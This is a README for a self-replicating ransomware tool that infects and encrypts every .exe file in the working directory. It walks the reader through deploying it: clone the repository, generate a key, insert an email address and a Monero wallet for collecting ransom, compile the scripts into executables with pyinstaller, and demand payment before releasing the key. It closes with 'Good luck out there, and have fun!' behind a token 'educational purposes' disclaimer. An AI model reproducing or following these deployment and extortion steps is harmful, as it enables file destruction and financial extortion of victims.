			ABOUT

#	FOR EDUCATIONAL PURPOSES ONLY
# I AM NOT RESPONSIBLE FOR ANY MISUSE/DAMAGES TO YOUR COMPUTER

This is a self replicating ransomware program that is VERY annoying for the victim. Once this program runs, it copies itself to all exe programs in current working
directory, than it also encrypts all the exe programs in the current working directory. Once victim pays the ransom, th




			GET THE REPO & SETUP
git clone https://github.com/hestihesti/Sticky
cd Sticky
pip3 install cryptography
pip3 install glob
pip3 install ast


			RUNNING THE PROGRAM


1. Run KeyGen.py (otherwise MASTER.key will be default)
>>	python3 KeyGen.py
		- Label The Key Name

2. Make a backup of the key (by default MASTER_bu.key is the backup key)
>>	cp {keyName}.key {keyName}_bu.key

3. Go into goo.py file
>>	nano goo.py
		- edit the name of key(its placed in the "malicious_code()" function, I also have it a comment line above where it needs to be edited)
		- edit the email address for victim to notify you of payment (if they do send payment, send them the key)
		- edit the xmr_wallet adress to your own to receive payment
4. Go into decrypt.py
>>	nano decrypt.py
		- edit the script where its using key (its placed in the "malicious_code()" function, I also have it a comment line above where it needs to be edited)

5. Now all you need to do is use pyinstaller to convert the goo.py  and decrypt.py into an .exe.

6. Now all exe files will be available for one time use, than you will need to be decrpyted again after an exe file runs. 

7. When decrypting the .exe programs, the victim will need to send you an email requesting a cryptocurrency wallet to send the funds to (preferable monero(XMR)). When
- payment is made, you will send them the backup key. ** Do tell them to keep the key, cause their exe files will always be infected.

8. Good luck out there, and have fun!
